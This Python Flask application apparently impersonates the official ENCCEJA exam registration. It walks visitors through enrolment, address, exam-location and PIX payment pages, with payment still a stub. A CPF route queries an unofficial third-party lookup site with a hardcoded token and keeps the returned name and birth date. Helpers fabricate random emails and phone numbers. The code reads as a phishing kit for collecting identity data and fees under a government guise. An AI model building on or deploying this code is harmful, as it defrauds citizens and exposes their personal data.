import os
import secrets
import functools
import json
import random
import string
import re
import time
import logging
from datetime import datetime
from urllib.parse import parse_qs, urlparse
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, make_response
import requests

# Configurar Flask app
app = Flask(__name__)

# In-memory store for payment status (in production, use Redis or database)
payment_status_store = {}

# Domínio autorizado - Permitindo todos os domínios
AUTHORIZED_DOMAIN = "*"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        # Permita acesso independente do referer
        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
        return f(*args, **kwargs)
        
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"({ddd}) {number[:4]}-{number[4:]}"

def generate_transaction_id():
    """Gera um ID de transação único para o pagamento"""
    timestamp = str(int(time.time()))
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"TX{timestamp}{random_part}"

# Routes
@app.route('/', methods=['GET'])
@check_referer
def index():
    """Redirecionar automaticamente para /inscricao conforme solicitado"""
    return redirect('/inscricao')

@app.route('/inscricao', methods=['GET'])
@check_referer
def inscricao():
    """Página de inscrição do ENCCEJA"""
    return render_template('inscricao.html')

@app.route('/encceja-info', methods=['GET'])
@check_referer
def encceja_info():
    """Página de informações do ENCCEJA"""
    return render_template('encceja_info.html')

@app.route('/validar-dados', methods=['GET'])
@check_referer
def validar_dados():
    """Página de validação de dados"""
    return render_template('validar_dados.html')

@app.route('/endereco', methods=['GET'])
@check_referer
def endereco():
    """Página de endereço"""
    return render_template('endereco.html')

@app.route('/local-prova', methods=['GET'])
@check_referer
def local_prova():
    """Página de local de prova"""
    return render_template('local_prova.html')

@app.route('/pagamento', methods=['GET', 'POST'])
@check_referer
def pagamento():
    """Página de pagamento PIX - aguardando nova integração WitePay"""
    if request.method == 'POST':
        # Aguardando nova documentação WitePay
        return jsonify({
            'success': False,
            'error': 'Sistema de pagamento será implementado com nova documentação WitePay'
        }), 503
    
    return render_template('pagamento.html')

@app.route('/inscricao-sucesso', methods=['GET'])
@check_referer
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    return render_template('inscricao_sucesso.html')

@app.route('/create-pix-payment', methods=['POST'])
@check_referer
def create_pix_payment():
    """Aguardando nova integração WitePay"""
    return jsonify({
        'success': False,
        'error': 'Sistema PIX será implementado com nova documentação WitePay'
    }), 503

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na API (para a página de inscrição)"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # API funcionando conforme verificado
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"[PROD] Resposta da API: {data}")
            
            # API retorna dados na estrutura {'DADOS': {...}}
            if data.get("DADOS"):
                dados = data["DADOS"]
                user_data = {
                    'cpf': dados.get('cpf', cpf_numerico),
                    'nome': dados.get('nome', ''),
                    'dataNascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                    'situacaoCadastral': "REGULAR",
                    'telefone': '',
                    'email': '',
                    'sucesso': True
                }
                
                # Armazenar dados na sessão para uso no fluxo
                session['user_data'] = user_data
                
                app.logger.info(f"[PROD] CPF consultado com sucesso: {cpf}")
                return jsonify(user_data)
            else:
                app.logger.error(f"API não retornou DADOS: {data}")
                return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
        else:
            app.logger.error(f"Erro de conexão com a API: {response.status_code}")
            return jsonify({"error": "Erro ao consultar CPF", "sucesso": False}), 500
            
    except Exception as e:
        app.logger.error(f"Erro ao consultar CPF: {str(e)}")
        return jsonify({"error": "Erro interno ao processar consulta", "sucesso": False}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)